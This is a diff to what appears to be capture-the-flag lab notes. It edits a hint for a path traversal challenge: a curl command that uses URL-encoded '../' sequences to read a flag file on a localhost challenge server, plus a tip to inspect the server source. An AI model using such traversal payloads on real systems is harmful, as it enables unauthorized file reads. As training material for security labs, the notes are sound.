@@ -8,11 +8,12 @@ controlled environment for educational or security assessment purposes.
 
 <details>
 <summary style="cursor:pointer">Path traversal 1</summary>
-  
--  "..%2F" is URL-encoding of "../"
+
+- check the /challenge/server with cat for the correct URL ending
+- "..%2F" is URL-encoding of "../"
   
 ```bash
-curl -v http://challenge.localhost:80/package/..%2F..%2Fflag
+curl -v http://challenge.localhost:80/CHECK-URL/..%2F..%2Fflag
 ```
 
 </details>
